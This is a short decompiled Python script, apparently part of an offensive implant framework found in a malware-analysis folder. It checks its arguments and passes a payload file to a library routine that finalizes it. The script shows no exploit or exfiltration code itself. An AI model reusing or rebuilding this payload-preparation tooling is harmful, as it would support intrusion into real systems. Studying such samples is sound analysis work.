# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: _FinalizePayload.py
import dsz, pc.payload.settings, sys

def main():
    if len(sys.argv) != 2:
        dsz.ui.Echo('Usage: %s <payloadFile>' % sys.argv[0], dsz.ERROR)
        return False
    return pc.payload.settings.Finalize(sys.argv[1])


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)
# okay decompiling D:\work\malware\bvp47\FB\Resources\Pc\PyScripts\Payload\_FinalizePayload.pyo
